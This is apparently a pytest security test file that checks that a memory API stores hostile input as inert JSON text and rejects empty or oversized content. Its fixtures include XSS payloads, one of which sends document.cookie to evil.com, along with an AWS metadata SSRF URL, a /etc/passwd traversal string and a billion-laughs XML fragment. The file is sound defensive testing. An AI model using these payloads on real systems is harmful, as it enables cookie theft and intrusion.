"""Sprint 6B — Storage security and data sanitization tests.

All content stored by the system must be safe data — never executable.
This includes direct storage via memory API and indirect via ingestion pipeline.
"""

import pytest


class TestStorageSecurity:
    """Content persisted to DB is treated as data, not code."""

    @pytest.mark.asyncio
    async def test_html_stored_as_text(self, client, seeded_workspace):
        """HTML tags are stored as plain text."""
        payload = '<div onclick="alert(1)">XSS test</div>'
        res = await client.post("/api/v1/memory/", json={
            "content": payload,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201
        assert "XSS test" in res.json()["content"]
        assert "onclick" in res.json()["content"]

    @pytest.mark.asyncio
    async def test_xss_script_tag_stored_as_text(self, client, seeded_workspace):
        """Script tags are stored, never executed."""
        payload = '<script>document.location="http://evil.com/steal"</script>'
        res = await client.post("/api/v1/memory/", json={
            "content": payload,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201
        assert "script" in res.json()["content"]

    @pytest.mark.asyncio
    async def test_xss_event_handler_stored_as_text(self, client, seeded_workspace):
        """Event handlers in stored HTML are data."""
        payload = '<img src=x onerror="fetch(\'http://evil.com?steal=\'+document.cookie)">'
        res = await client.post("/api/v1/memory/", json={
            "content": payload,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201
        assert "onerror" in res.json()["content"]

    @pytest.mark.asyncio
    async def test_ssrf_in_content_stored_as_data(self, client, seeded_workspace):
        """SSRF payloads in content are stored, not executed."""
        ssrf = "Visit http://169.254.169.254/latest/meta-data/ for AWS creds"
        res = await client.post("/api/v1/memory/", json={
            "content": ssrf,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201
        assert ssrf in res.json()["content"]

    @pytest.mark.asyncio
    async def test_path_traversal_stored_as_data(self, client, seeded_workspace):
        """Path traversal strings are data, not file access."""
        traversal = "../../etc/passwd"
        res = await client.post("/api/v1/memory/", json={
            "content": traversal,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201
        assert traversal in res.json()["content"]

    @pytest.mark.asyncio
    async def test_format_string_stored_as_data(self, client, seeded_workspace):
        """Format string payloads are stored as text."""
        fmt = "%s%s%s%s%s%s%s%s%s%s"
        res = await client.post("/api/v1/memory/", json={
            "content": fmt,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201

    @pytest.mark.asyncio
    async def test_billion_laughs_stored_as_data(self, client, seeded_workspace):
        """Billion laughs XML entity expansion is stored as text."""
        xml = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>'
        res = await client.post("/api/v1/memory/", json={
            "content": xml,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201

    @pytest.mark.asyncio
    async def test_embedded_images_are_text_references(self, client, seeded_workspace):
        """Data URLs in content are stored as text strings."""
        data_url = "data:text/html,<script>alert('xss')</script>"
        res = await client.post("/api/v1/memory/", json={
            "content": data_url,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201
        assert data_url == res.json()["content"]


class TestDataSanitization:
    """Dangerous content patterns are rejected or sanitized."""

    @pytest.mark.asyncio
    async def test_content_too_long_rejected(self, client, seeded_workspace):
        """Excessively long content is rejected."""
        res = await client.post("/api/v1/memory/", json={
            "content": "A" * 1_000_001,
        }, headers=seeded_workspace["headers"])
        assert res.status_code in (400, 422, 413)

    @pytest.mark.asyncio
    async def test_normal_length_content_accepted(self, client, seeded_workspace):
        """Content up to reasonable limits is accepted."""
        res = await client.post("/api/v1/memory/", json={
            "content": "A" * 100_000,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201

    @pytest.mark.asyncio
    async def test_empty_content_rejected(self, client, seeded_workspace):
        """Empty string content is rejected."""
        res = await client.post("/api/v1/memory/", json={
            "content": "",
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 422

    @pytest.mark.asyncio
    async def test_whitespace_only_content_rejected(self, client, seeded_workspace):
        """Whitespace-only content is rejected."""
        res = await client.post("/api/v1/memory/", json={
            "content": "   \t\n   ",
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 422

    @pytest.mark.asyncio
    async def test_content_type_is_json_never_executed(self, client, seeded_workspace):
        """API always returns application/json — never HTML or script."""
        # Upload content that looks like HTML
        html = "<b>bold</b> and <script>evil()</script>"
        res = await client.post("/api/v1/memory/", json={
            "content": html,
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201
        content_type = res.headers.get("content-type", "")
        assert "application/json" in content_type

    @pytest.mark.asyncio
    async def test_metadata_doesnt_execute_code(self, client, seeded_workspace):
        """Metadata with dangerous strings is stored as data."""
        res = await client.post("/api/v1/memory/", json={
            "content": "Normal content",
            "extra_metadata": {
                "note": "<script>alert('meta')</script>",
                "source": "javascript:void(0)",
            },
        }, headers=seeded_workspace["headers"])
        assert res.status_code == 201
        data = res.json()
        assert "<script>" in data["extra_metadata"]["note"]
